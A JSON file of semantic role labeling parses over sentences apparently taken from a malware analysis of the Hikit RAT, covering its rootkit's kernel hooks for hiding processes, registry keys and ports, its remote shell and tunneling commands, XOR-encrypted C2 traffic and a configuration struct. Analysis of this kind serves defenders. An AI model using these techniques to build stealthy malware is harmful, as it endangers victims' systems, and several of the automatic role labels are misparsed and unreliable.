{"ARG0": {"text": "an attacker"}, "V": {"text": "access", "index": 31}, "ARG1": {"text": "the victim machine"}}}, " The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS\nsensors that look for encrypted traffic": {"will": {"V": {"text": "will", "index": 2}}, "send": {"ARG0": {"text": "The DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "send", "index": 3}, "ARG1": {"text": "a legitimate SSL certificate"}, "ARGM-PRD": {"text": "as a"}, "ARG2": {"text": "means to disrupt heuristic IDS sensors that look for encrypted traffic"}}, "disrupt": {"ARG0": {"text": "a legitimate SSL certificate"}, "ARGM-MNR": {"text": "a means"}, "V": {"text": "disrupt", "index": 12}, "ARG1": {"text": "heuristic IDS sensors that look for encrypted traffic"}}, "look": {"ARG0": {"text": "heuristic IDS sensors"}, "R-ARG0": {"text": "that"}, "V": {"text": "look", "index": 17}, "ARG1": {"text": "for encrypted traffic"}}, "encrypted": {"V": {"text": "encrypted", "index": 19}, "ARG1": {"text": "traffic"}}}, " If the uninstall argument exists,\t\n \u00a0mainThread\t\n \u00a0will simply remove the\nDriver from the victim\u2019s machine and terminate": {"exists": {"ARG1": {"text": "the uninstall argument"}, "V": {"text": "exists", "index": 4}}, "will": {"V": {"text": "will", "index": 7}}, "remove": {"ARGM-ADV": {"text": "If the uninstall argument exists/ simply"}, "ARG0": {"text": "mainThread"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "remove", "index": 9}, "ARG1": {"text": "the Driver"}, "ARG2": {"text": "from the victim \u2019s machine"}}}, " The\nRAT supports the following commands:\n<table>\n\n       Command       Introduced   Description\n       shell         Gen 1.0      Establishes a remote command shell on the victim machine\n       file          Gen 1.0      File managerment\n       connect       Gen 1.0      Establishes a tunnel connection (e.g": {"supports": {"ARG0": {"text": "The RAT"}, "V": {"text": "supports", "index": 2}, "ARG1": {"text": "the following commands"}}, "following": {"V": {"text": "following", "index": 4}, "ARG1": {"text": "commands"}}, "Introduced": {"ARG0": {"text": "Command"}, "V": {"text": "Introduced", "index": 8}, "ARG1": {"text": "Description shell Gen 1.0"}}}, " Following this, the DLL will then attempt to install the correct\nversion of the Driver prior to terminating": {"Following": {"V": {"text": "Following", "index": 0}, "ARG2": {"text": "this"}}, "will": {"ARGM-TMP": {"text": "Following this"}, "V": {"text": "will", "index": 5}}, "attempt": {"ARGM-TMP": {"text": "Following this/ then"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 7}, "ARG1": {"text": "to install the correct version of the Driver prior to terminating"}}, "install": {"ARG0": {"text": "the DLL"}, "V": {"text": "install", "index": 9}, "ARG1": {"text": "the correct version of the Driver"}, "ARGM-TMP": {"text": "prior to terminating"}}}, "\n\n\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n<code>\n       struct Config\n       {\n          WCHAR wszComment[32];\n          C2ConfigInfo arrC2s[2];\n          ListeningPortConfig ListeningPorts[10];\n          int dwStartTime;\n          int dwEndTime;\n          __int16 Flags;\n          SYSTEMTIME sleepUntil;\n          __int16 unused_align2_2;\n          int fRunHidden;\n       };\n\n       struct C2ConfigInfo\n       {\n          WCHAR wszAddress[32];\n          __int16 wPort;\n          __int16 unused_align2;\n          int fValidC2;\n       };\n\n       struct ListeningPortConfig\n       {\n          unsigned __int16 wPort;\n          unsigned __int16 unused_align2;\n          int fReady;\n          SOCKET hSocket;\n          HANDLE hEvent;\n          HANDLE hListenerThread;\n       };\n\t\n</code>\n\nIn order to provide some level of stealth, the RAT will install a rootkit on 32-bit versions of Windows": {"provide": {"V": {"text": "provide", "index": 3}, "ARG1": {"text": "some level of stealth"}}, "will": {"ARGM-PRP": {"text": "In order to provide some level of stealth"}, "ARG0": {"text": "the RAT"}, "V": {"text": "will", "index": 11}, "ARG1": {"text": "install a rootkit on 32-bit versions of Windows"}}, "install": {"ARGM-PRP": {"text": "In order to provide some level of stealth"}, "ARG0": {"text": "the RAT"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 12}, "ARG1": {"text": "a rootkit"}, "ARG2": {"text": "on 32-bit versions of Windows"}}}, "\n\nIn Gen 1.2, the communication between the infected machine and the attacker is encrypted using an\nXOR mask": {"infected": {"V": {"text": "infected", "index": 8}, "ARG1": {"text": "machine"}}, "is": {"ARGM-DIS": {"text": "In Gen 1.2"}, "ARG1": {"text": "the communication between the infected machine and the attacker"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "encrypted using an XOR mask"}}, "encrypted": {"ARGM-EXT": {"text": "In Gen 1.2"}, "ARG1": {"text": "the communication between the infected machine and the attacker"}, "V": {"text": "encrypted", "index": 14}, "ARGM-MNR": {"text": "using an XOR mask"}}, "using": {"V": {"text": "using", "index": 15}, "ARG1": {"text": "an XOR mask"}}}, " The following table maps\nthe items the Driver can hide to the API function that the Driver hooks:\n<table>\n        Item                                                                                                                                                        API Function Hooked\n        Process ID                                                                                                                                                  ZwDeviceIoControlFile\n        (PID)\n        Registry Key                                                                                                                                                ZwEnumerateKey\n        Registry Value                                                                                                                                              ZwEnumerateValueKey\n        Directory                                                                                                                                                   QueryDirectoryFile\n\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0 \t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\n<footnote>\n1\n  \t\n \u00a0James\t\n \u00a0Antognini\t\n \u00a0and\t\n \u00a0Thomas\t\n \u00a0F.\t\n \u00a0Divine.\t\n \u00a0\u201cExtending\t\n \u00a0the\t\n \u00a0Microsoft\t\n \u00a0PassThru\t\n \u00a0NDIS\t\n \u00a0Intermediate\t\n \u00a0Driver\u2014Parts:\t\n \u00a0Two\t\n \u00a0IP\t\n \u00a0\nAddress\t\n \u00a0Blocking\t\n \u00a0NDIS\t\n \u00a0IM\t\n \u00a0Drivers\u201d.\t\n \u00a0December\t\n \u00a015,\t\n \u00a02003\t\n \u00a0\n2\n  \t\n \u00a0pudn.\t\n \u00a0\u201cAgony\t\n \u00a0Rootkit\t\n \u00a0code,\t\n \u00a0the\t\n \u00a0stability\t\n \u00a0and\t\n \u00a0can\t\n \u00a0be\t\n \u00a0useful\t\n \u00a0Driver\t\n \u00a0Develop\u201d.\t\n \u00a0\nhttp://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n \u00a08\t\n \u00a0April\t\n \u00a02007.\t\n \u00a0\t\n \u00a0\n3\n  \t\n \u00a0CardMagic.\t\n \u00a0\u201c[Reserved]\t\n \u00a0NSI\t\n \u00a0Module\t\n \u00a0Hook:\t\n \u00a0Hiding\t\n \u00a0Port\t\n \u00a0Under\t\n \u00a0Windows\t\n \u00a0Vista\u201d.\t\n \u00a0http://forum.eviloctal.com/archiver/tid-\u00ad\u2010\n29604.html.\t\n \u00a08\t\n \u00a0July\t\n \u00a02007.\t\n</footnote>\n \u00a0\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\n       Item              API Function Hooked\n       Local Listening   ZwDeviceIoControlFile\n       Port\n       Remote            ZwDeviceIoControlFile\n       Endpoint\n       Loaded Drivers    ZwQuerySystemInformation\n\t\n</table>\n\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the\nlinked list of services and remove the service entry that the Driver wishes to hide": {"following": {"V": {"text": "following", "index": 1}}, "maps": {"ARG0": {"text": "The following table"}, "V": {"text": "maps", "index": 3}, "ARG1": {"text": "the items the Driver can hide to the API function"}, "ARG2": {"text": "that the Driver hooks"}}, "can": {"ARG1": {"text": "the items"}, "V": {"text": "can", "index": 8}}, "hide": {"ARG1": {"text": "the items"}, "ARG0": {"text": "the Driver"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "hide", "index": 9}, "ARG2": {"text": "to the API function"}}, "hide_2": {"V": {"text": "hide", "index": 22}, "ARG1": {"text": "services"}}, "will": {"ARGM-PRP": {"text": "In order to hide services"}, "ARG0": {"text": "the Driver"}, "V": {"text": "will", "index": 27}, "ARG1": {"text": "access the memory of the services.exe process"}}, "access": {"ARGM-PRP": {"text": "In order to hide services"}, "ARG0": {"text": "the Driver"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "access", "index": 28}, "ARG1": {"text": "the memory of the services.exe process"}}, "locate": {"ARGM-PRP": {"text": "In order to hide services"}, "ARG0": {"text": "the Driver"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "locate", "index": 36}, "ARG1": {"text": "the linked list of services"}}, "linked": {"V": {"text": "linked", "index": 38}, "ARG1": {"text": "list"}}, "remove": {"ARGM-PRP": {"text": "In order to hide services"}, "ARG0": {"text": "the Driver"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "remove", "index": 43}, "ARG1": {"text": "the service entry that the Driver wishes to"}}, "wishes": {"ARG0": {"text": "the Driver"}, "V": {"text": "wishes", "index": 50}, "ARG1": {"text": "to hide"}}, "hide_3": {"ARG1": {"text": "the service entry"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "the Driver"}, "V": {"text": "hide", "index": 52}}}, "\n\n\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\nFrom a system objects perspective, Gen 2 samples produce up to three named events": {"objects": {"ARG1": {"text": "system"}, "V": {"text": "objects", "index": 3}, "ARG0": {"text": "perspective"}}, "produce": {"ARGM-ADV": {"text": "From a system objects perspective"}, "ARG1": {"text": "Gen 2 samples"}, "V": {"text": "produce", "index": 9}, "ARG3": {"text": "to three named events"}}, "named": {"V": {"text": "named", "index": 13}, "ARG2": {"text": "events"}}}, "\n</section>\n<section>\n<heading>Gen 2 Analysis</heading>\nThe Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality": {"uses": {"ARG0": {"text": "The Gen 2 sub - family"}, "ARGM-MNR": {"text": "like Gen 1.2"}, "V": {"text": "uses", "index": 11}, "ARG1": {"text": "a DLL"}, "ARG2": {"text": "for the core of its RAT functionality"}}}, " The authors of Gen 1 used freely available source code\nfound online for their removal function.<fn>4</fn>\n\n\n\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0 \t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\n<footnote>\n4\n \t\n \u00a0PCAUSA.\t\n \u00a0\u201cProgrammatically\t\n \u00a0Installing\t\n \u00a0NDIS\t\n \u00a0Protocol\t\n \u00a0Drivers\u201d\t\n \u00a0http://www.ndis.com/ndis-\u00ad\u2010\ngeneral/ndisinstall/programinstall.htm.\t\n \u00a02\t\n \u00a0December\t\n \u00a02013.\t\n </footnote>\n \u00a0\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\nWhen the DLL activates, either by a call to\t\nDllEntryPoint\t\nor by calling\t\nDllRegisterServer\t\n\nwithout the u parameter,\t\nmainThread\t\nbegins by verifying the version of the Driver installed on the\nvictim\u2019s machine": {"used": {"ARG0": {"text": "Gen 1"}, "V": {"text": "used", "index": 5}, "ARG1": {"text": "freely available source code"}}, "found": {"ARG0": {"text": "The authors of Gen 1 used freely available source code"}, "V": {"text": "found", "index": 10}, "ARGM-LOC": {"text": "online"}, "ARG1": {"text": "for their removal function"}, "ARGM-TMP": {"text": "When the DLL activates , either/ by calling DllRegisterServer without the u parameter , mainThread begins by verifying the version of the Driver installed on the victim \u2019s machine"}, "ARGM-MNR": {"text": "by a call to DllEntryPoint or"}}, "calling": {"V": {"text": "calling", "index": 30}, "ARG1": {"text": "DllRegisterServer"}, "ARGM-MNR": {"text": "without the u parameter"}}, "verifying": {"V": {"text": "verifying", "index": 40}, "ARG1": {"text": "the version of the Driver installed on the victim \u2019s machine"}}, "installed": {"ARG1": {"text": "the Driver"}, "V": {"text": "installed", "index": 46}, "ARG2": {"text": "on the victim \u2019s machine"}}}, " The Loaders,\nupon unloading, will call the StopServer function in order to shut down the embedded DLL": {"will": {"ARG0": {"text": "The Loaders"}, "ARGM-PRD": {"text": "upon unloading"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "call the StopServer function"}, "ARGM-PRP": {"text": "in order to shut down the embedded DLL"}}, "call": {"ARG0": {"text": "The Loaders"}, "ARGM-PRD": {"text": "upon unloading"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "call", "index": 7}, "ARG1": {"text": "the StopServer function"}, "ARGM-PRP": {"text": "in order to shut down the embedded DLL"}}, "shut": {"ARG0": {"text": "The Loaders"}, "V": {"text": "shut", "index": 14}, "ARG1": {"text": "the embedded DLL"}}, "embedded": {"V": {"text": "embedded", "index": 17}, "ARG1": {"text": "DLL"}}}, "\nThe DLL\u2019s RAT functionality provides basic features such as network port forwarding (proxying), file\ntransfer, and remote command shell": {"provides": {"ARG0": {"text": "The DLL \u2019s RAT functionality"}, "V": {"text": "provides", "index": 5}, "ARG1": {"text": "basic features such as network port forwarding ( proxying ) , file transfer , and remote command shell"}}, "forwarding": {"ARG0": {"text": "basic features such as network port"}, "V": {"text": "forwarding", "index": 12}, "ARG1": {"text": "( proxying ) , file transfer , and remote command shell"}}}, "\nThe communication between the Gen 2 malware and the C2 (or other Gen 2 malware, in the case of\nthe internal routing functionality) is encrypted using a simple DWORD XOR scheme": {"is": {"ARG1": {"text": "The communication between the Gen 2 malware and the C2 ( or other Gen 2 malware/ functionality )"}, "ARGM-ADV": {"text": "in the case of the internal routing"}, "V": {"text": "is", "index": 26}, "ARG2": {"text": "encrypted using a simple DWORD XOR scheme"}}, "encrypted": {"ARG1": {"text": "The communication between the Gen 2 malware and the C2 ( or other Gen 2 malware/ routing functionality )"}, "ARGM-ADV": {"text": "in the case of the internal"}, "V": {"text": "encrypted", "index": 27}, "ARGM-MNR": {"text": "using a simple DWORD XOR scheme"}}, "using": {"V": {"text": "using", "index": 28}, "ARG1": {"text": "a simple DWORD XOR scheme"}}}, " Each Gen 2 infection can support up to 10 listening ports": {"can": {"ARG0": {"text": "Each Gen 2 infection"}, "V": {"text": "can", "index": 4}, "ARG1": {"text": "support up to 10 listening ports"}}, "support": {"ARG0": {"text": "Each Gen 2 infection"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "support", "index": 5}, "ARG1": {"text": "up to 10 listening ports"}}}, "\nImageLoaderData::LoadDll\t\n \u00a0interprets the PE/COFF header of the DLL image, loads the image\ninto the appropriate memory configuration, performs the necessary relocation operations, and calls the\t\n\nDllMain\t\n(DLL\u2019s entry point) function": {"interprets": {"ARG0": {"text": "ImageLoaderData::LoadDll"}, "V": {"text": "interprets", "index": 1}, "ARG1": {"text": "the PE / COFF header of the DLL image"}}, "loads": {"ARG0": {"text": "ImageLoaderData::LoadDll"}, "V": {"text": "loads", "index": 12}, "ARG1": {"text": "the image"}, "ARG2": {"text": "into the appropriate memory configuration"}}, "performs": {"ARG0": {"text": "ImageLoaderData::LoadDll interprets"}, "V": {"text": "performs", "index": 21}, "ARG1": {"text": "the necessary relocation operations"}}, "calls": {"ARG0": {"text": "ImageLoaderData::LoadDll interprets"}, "V": {"text": "calls", "index": 28}, "ARG1": {"text": "the DllMain"}, "ARG2": {"text": "( DLL/ \u2019s entry point ) function"}}}, " The second generation of Hikit\n(referred to as \u201cGen 2\u201d) uses the more traditional client model and beacons out to an attacker\u2019s C2\nserver": {"referred": {"V": {"text": "referred", "index": 6}, "ARG1": {"text": "to"}, "ARG2": {"text": "as"}}, "uses": {"ARG0": {"text": "The second generation of Hikit ( referred to as \u201c Gen 2 \u201d )"}, "V": {"text": "uses", "index": 14}, "ARG1": {"text": "the more traditional client model and beacons"}, "ARG2": {"text": "to an attacker \u2019s C2 server"}}}, " The DLL contains only two exports: DllEntryPoint\t\n \u00a0and\t\n \u00a0\nDllRegisterServer.\t\n \u00a0Ultimately, both exports generate a new thread of the same function\n(\u201cmainThread\u201d)": {"contains": {"ARG0": {"text": "The DLL"}, "V": {"text": "contains", "index": 2}, "ARG1": {"text": "only two exports"}}, "generate": {"ARGM-TMP": {"text": "Ultimately"}, "ARG0": {"text": "both exports"}, "V": {"text": "generate", "index": 15}, "ARG1": {"text": "a new thread of the same function ( \u201c mainThread \u201d )"}}}, " it doesn\u2019t match the specified\nversion), the DLL installs the version of the Driver found within the DLL\u2019s resource section (under the\t\n\nBIN\t\nresource tree).\t\n \u00a0\t\n \u00a0\n\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will\ninstruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen\n1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate\nURL": {"does": {"V": {"text": "does", "index": 1}}, "match": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "n\u2019t"}, "V": {"text": "match", "index": 3}, "ARG1": {"text": "the specified version )"}}, "specified": {"V": {"text": "specified", "index": 5}, "ARG1": {"text": "version"}}, "installs": {"ARG0": {"text": "the DLL"}, "V": {"text": "installs", "index": 11}, "ARG1": {"text": "the version of the Driver found within the DLL \u2019s resource section ( under the BIN resource tree )"}}, "found": {"ARG1": {"text": "the Driver"}, "V": {"text": "found", "index": 17}, "ARGM-LOC": {"text": "within the DLL \u2019s resource section ( under the BIN resource tree )"}}, "verified": {"ARG0": {"text": "the Driver version"}, "V": {"text": "verified", "index": 36}, "ARG1": {"text": "( or forcibly corrected"}, "ARGM-MNR": {"text": "by installing the appropriate Driver )"}}, "corrected": {"ARG1": {"text": "the Driver version verified ( or"}, "ARGM-MNR": {"text": "forcibly/ by installing the appropriate Driver )"}, "V": {"text": "corrected", "index": 40}}, "installing": {"V": {"text": "installing", "index": 42}, "ARG1": {"text": "the appropriate Driver )"}}, "will": {"ARGM-ADV": {"text": "With the Driver version verified ( or forcibly corrected by installing the appropriate Driver )/ as the acknowledgment value"}, "ARG0": {"text": "the DLL"}, "V": {"text": "will", "index": 50}, "ARG1": {"text": "instruct the Driver to use a specified string ( for Gen 1.0 and Gen 1.1 samples ) or a DWORD ( for Gen 1.2 samples )"}, "ARGM-PRP": {"text": "to send to a connecting client who requests the appropriate"}}, "instruct": {"ARGM-MNR": {"text": "With the Driver version verified ( or forcibly corrected by installing the appropriate Driver )"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "instruct", "index": 51}, "ARG1": {"text": "the Driver"}, "ARG2": {"text": "to use a specified string ( for Gen 1.0 and Gen 1.1 samples ) or a DWORD ( for Gen 1.2 samples"}, "ARG4": {"text": ") as the acknowledgment value to send to a connecting client who requests the appropriate URL"}}, "use": {"V": {"text": "use", "index": 55}, "ARG1": {"text": "a specified string ( and Gen 1.1 samples ) or a DWORD ("}, "ARG2": {"text": "for Gen 1.0/ for Gen 1.2 samples"}}, "specified_2": {"V": {"text": "specified", "index": 57}, "ARG1": {"text": "string"}}, "Gen": {"ARG0": {"text": "the DLL"}, "V": {"text": "Gen", "index": 64}, "ARG1": {"text": "1.1 samples ) or a DWORD ("}, "ARG4": {"text": "for Gen 1.2 samples ) as the acknowledgment value to send to a connecting client who requests the appropriate URL"}}, "send": {"ARG0": {"text": "the acknowledgment"}, "V": {"text": "send", "index": 82}, "ARG2": {"text": "to a connecting client who requests the appropriate URL"}}, "connecting": {"V": {"text": "connecting", "index": 85}, "ARG1": {"text": "client"}}, "requests": {"ARG0": {"text": "a connecting client"}, "R-ARG0": {"text": "who"}, "V": {"text": "requests", "index": 88}, "ARG1": {"text": "the appropriate URL"}}}, " The RAT functionality code then activates the service and opens a handle to\ndevice driver\u2019s interface (e.g": {"activates": {"ARG0": {"text": "The RAT functionality code"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "activates", "index": 5}, "ARG1": {"text": "the service"}}, "opens": {"ARG0": {"text": "The RAT functionality code"}, "V": {"text": "opens", "index": 9}, "ARG1": {"text": "a handle to device driver \u2019s interface ( e.g"}}}, " The purpose of this behavior is to allow the DLL to interact\nwith the network without utilizes the WinSock API which could potentially reveal the presence of Hikit": {"is": {"ARG1": {"text": "The purpose of this behavior"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to allow the DLL to interact with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit"}}, "allow": {"V": {"text": "allow", "index": 7}, "ARG1": {"text": "the DLL to interact with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit"}}, "interact": {"ARG0": {"text": "the DLL"}, "V": {"text": "interact", "index": 11}, "ARG1": {"text": "with the network"}, "ARGM-MNR": {"text": "without utilizes the WinSock API which could potentially reveal the presence of Hikit"}}, "utilizes": {"ARG0": {"text": "the DLL"}, "V": {"text": "utilizes", "index": 16}, "ARG1": {"text": "the WinSock API which could potentially reveal the presence of Hikit"}}, "could": {"V": {"text": "could", "index": 21}}, "reveal": {"ARG0": {"text": "the WinSock API"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "could"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "reveal", "index": 23}, "ARG1": {"text": "the presence of Hikit"}}}, "\n</section>\n<section>\n<heading>Command: \u00a0information </heading>\nGen 2 samples rely on a configuration in order to know where the C2 server exists along with other\noperational aspects such as the name of its service and operational times": {"Gen": {"V": {"text": "Gen", "index": 0}, "ARG1": {"text": "2 samples"}}, "rely": {"ARG0": {"text": "Gen 2 samples"}, "V": {"text": "rely", "index": 3}, "ARG1": {"text": "on a configuration"}, "ARGM-PRP": {"text": "in order to know where the C2 server exists along with other operational aspects such as the name of its service and operational times"}}, "know": {"V": {"text": "know", "index": 10}, "ARG1": {"text": "where the C2 server exists along with other operational aspects such as the name of its service and operational times"}}, "exists": {"ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the C2 server"}, "V": {"text": "exists", "index": 15}, "C-ARG1": {"text": "along with other operational aspects such as the name of its service and operational times"}}}, "\nWhen the Driver establishes a new channel, the DLL generates a runtime data structure before\ngenerating a new thread (\u201cHikitThreadFunc\u201d) which will service any request coming from the new\nchannel": {"establishes": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "the Driver"}, "V": {"text": "establishes", "index": 3}, "ARG1": {"text": "a new channel"}}, "generates": {"ARGM-TMP": {"text": "When the Driver establishes a new channel/ before generating a new thread ( \u201c HikitThreadFunc \u201d ) which will service any request coming from the new channel"}, "ARG0": {"text": "the DLL"}, "V": {"text": "generates", "index": 10}, "ARG1": {"text": "a runtime data structure"}}, "generating": {"ARG0": {"text": "the DLL"}, "V": {"text": "generating", "index": 16}, "ARG1": {"text": "a new thread ( \u201c HikitThreadFunc \u201d ) which will service any request coming from the new channel"}}, "will": {"ARG0": {"text": "\u201c HikitThreadFunc \u201d )"}, "R-ARG0": {"text": "which"}, "V": {"text": "will", "index": 26}, "ARG1": {"text": "service any request coming from the new channel"}}, "service": {"ARG0": {"text": "\u201c HikitThreadFunc \u201d )"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "service", "index": 27}, "ARG1": {"text": "any request coming from the new channel"}}, "coming": {"ARG1": {"text": "any request"}, "V": {"text": "coming", "index": 30}, "ARG2": {"text": "from the new channel"}}}, " The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes, registry\nkeys and network connections associated with Gen 2 activity on the victim\u2019s system": {"is": {"ARG1": {"text": "The Gen 2 Driver"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a simpler system driver that acts as a rootkit to hide processes , registry keys and network connections associated with Gen 2 activity on the victim \u2019s system"}}, "acts": {"ARG0": {"text": "a simpler system driver"}, "R-ARG0": {"text": "that"}, "V": {"text": "acts", "index": 10}, "ARG1": {"text": "as a rootkit to hide processes , registry keys and network connections associated with Gen 2 activity on the victim \u2019s system"}}, "hide": {"V": {"text": "hide", "index": 15}, "ARG1": {"text": "processes , registry keys and network connections associated with Gen 2 activity"}}, "associated": {"ARG1": {"text": "registry keys and network connections"}, "V": {"text": "associated", "index": 23}, "ARG2": {"text": "with Gen 2 activity on the victim \u2019s system"}}}, " The DLL will\ncreate a new service (e.g": {"will": {"V": {"text": "will", "index": 2}}, "create": {"ARG0": {"text": "The DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "create", "index": 3}, "ARG1": {"text": "a new service ( e.g"}}}, " While the communication models shifted dramatically between Gen 1 and Gen 2, both\ngenerations of Hikit retain the same basic RAT function consisting of remote command shell, file\nmanagement, network proxy and port forwarding": {"shifted": {"ARG1": {"text": "the communication models"}, "V": {"text": "shifted", "index": 4}, "ARGM-MNR": {"text": "dramatically"}, "ARG2": {"text": "between Gen 1 and Gen 2"}}, "retain": {"ARGM-ADV": {"text": "While the communication models shifted dramatically between Gen 1 and Gen 2"}, "ARG0": {"text": "both generations of Hikit"}, "V": {"text": "retain", "index": 17}, "ARG1": {"text": "the same basic RAT function consisting of remote command shell , file management , network proxy and port forwarding"}}, "consisting": {"ARG1": {"text": "both generations of Hikit/ the same basic RAT function"}, "V": {"text": "consisting", "index": 23}, "ARG2": {"text": "of remote command shell , file management , network proxy and port forwarding"}}}, " It does not attempt to obfuscate its functionality from static analysis\nand it hooks a minimum number of kernel API functions in order to hide different pieces of information": {"does": {"V": {"text": "does", "index": 1}}, "attempt": {"ARG0": {"text": "It"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "attempt", "index": 3}, "ARG1": {"text": "to obfuscate its functionality from static analysis"}}, "obfuscate": {"V": {"text": "obfuscate", "index": 5}, "ARG1": {"text": "its functionality"}, "ARG2": {"text": "from static analysis"}}, "hooks": {"ARG1": {"text": "it"}, "V": {"text": "hooks", "index": 13}, "ARG2": {"text": "a minimum number of kernel API functions"}, "ARGM-PRP": {"text": "in order to hide different pieces of information"}}, "hide": {"V": {"text": "hide", "index": 24}, "ARG1": {"text": "different pieces of information"}}}, "\n\nBoth Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL (referred to as \u201cthe DLL\u201d) that\ncontains the RAT functionality; a kernel driver (referred to as \u201cthe Driver\u201d) with Gen 2 also employs an\nadditional component: a loader executable": {"Gen": {"V": {"text": "Gen", "index": 1}, "ARG1": {"text": "1"}}, "Gen_2": {"V": {"text": "Gen", "index": 4}, "ARG1": {"text": "2 sub - families"}}, "referred": {"ARG1": {"text": "a main DLL"}, "V": {"text": "referred", "index": 17}, "R-ARG1": {"text": "to"}, "ARG2": {"text": "as \u201c the DLL \u201d ) that contains the RAT functionality"}}, "contains": {"ARG0": {"text": "\u201c the DLL \u201d )"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 26}, "ARG1": {"text": "the RAT functionality"}}, "referred_2": {"V": {"text": "referred", "index": 35}, "ARG1": {"text": "to"}, "ARG2": {"text": "as \u201c the Driver \u201d ) with Gen 2"}}, "employs": {"ARG0": {"text": "a kernel driver ( referred to as \u201c the Driver \u201d ) with Gen 2"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "employs", "index": 47}, "ARG1": {"text": "an additional component : a loader executable"}}}, " To activate\nthe rootkit, the RAT functionality code creates a service with the driver in the %TEMP%\t\n \u00a0directory as the\nexecutable for the service": {"activate": {"V": {"text": "activate", "index": 1}, "ARG1": {"text": "the rootkit"}, "ARG0": {"text": "the RAT functionality code"}}, "creates": {"R-ARG0": {"text": "To activate the rootkit"}, "ARG0": {"text": "the RAT functionality code"}, "V": {"text": "creates", "index": 9}, "ARG1": {"text": "a service with the driver in the % TEMP% directory as the executable for the service"}}}, "\n        StartServer                                                                                                                                                               Activates the Gen 2 RAT (called from a DLL Loader)\n        StopServer                                                                                                                                                                Stops the Gen 2 RAT (called from a DLL Loader)\n</table>\n\nMatrixMain\t\nand\t\nStartServer\t\nboth ultimately generate a new thread (using the POSIX API function\t\n\nbeginthreadex\t\ninstead of the more common\t\nCreateThread) that contains the main loop of the Gen\n2 RAT functionality": {"called": {"ARG1": {"text": "the Gen 2 RAT ("}, "V": {"text": "called", "index": 7}, "ARG0": {"text": "from a DLL Loader ) StopServer"}}, "Stops": {"R-ARG0": {"text": "StartServer"}, "ARG0": {"text": "the Gen 2 RAT ( called from a DLL Loader ) StopServer"}, "V": {"text": "Stops", "index": 14}, "ARG1": {"text": "the Gen 2 RAT ( called 